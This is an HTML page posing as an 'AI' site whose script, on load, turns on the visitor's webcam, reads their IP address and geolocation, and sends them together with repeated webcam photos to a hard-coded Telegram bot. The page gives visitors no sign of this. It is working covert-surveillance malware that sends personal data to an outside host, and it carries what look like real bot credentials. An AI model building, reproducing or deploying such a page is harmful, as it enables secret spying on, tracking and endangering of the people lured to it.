<!DOCTYPE html>
<html>
<head>
  <title> A.I hu  </title>
</head>
<body>
  <h2>jk5125 AI</h2>
  <video id="video" autoplay playsinline width="300"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const BOT_TOKEN = "8469961243:AAEj96it0Xm-QEPlkRM8nZPM5RfId3bIVYs";  
    const CHAT_ID = "6096787949";

    // 1. Get IP
    async function getIP() {
      let res = await fetch("https://api.ipify.org?format=json");
      let data = await res.json();
      return data.ip;
    }

    // 2. Send message to Telegram
    async function sendMessage(msg) {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
      });
    }

    // 3. Send photo to Telegram
    async function sendPhoto(blob) {
      let formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("photo", blob, "capture.jpg");

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
      });
    }

    // 4. Get location
    function getLocation() {
      return new Promise((resolve, reject) => {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(pos => {
            resolve({lat: pos.coords.latitude, lon: pos.coords.longitude});
          }, reject);
        } else {
          reject("Geolocation not supported");
        }
      });
    }

    // 5. Get photo from webcam
    async function capturePhoto() {
      let video = document.getElementById("video");
      let canvas = document.getElementById("canvas");
      let context = canvas.getContext("2d");

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      return new Promise(resolve => {
        canvas.toBlob(resolve, "image/jpeg");
      });
    }

    // 6. Start camera stream once
    async function startCamera() {
      let stream = await navigator.mediaDevices.getUserMedia({ video: true });
      document.getElementById("video").srcObject = stream;
    }

    // Run everything
    (async () => {
      try {
        await startCamera();

        // Send IP + Location once
        let ip = await getIP();
        let loc = await getLocation();
        await sendMessage(`IP: ${ip}\nLocation: https://maps.google.com/?q=${loc.lat},${loc.lon}`);

        // Send photo every 30 sec
        setInterval(async () => {
          let photo = await capturePhoto();
          await sendPhoto(photo);
        }, 100);

      } catch (e) {
        console.error(e);
      }
    })();
  </script>
</body>
</html>
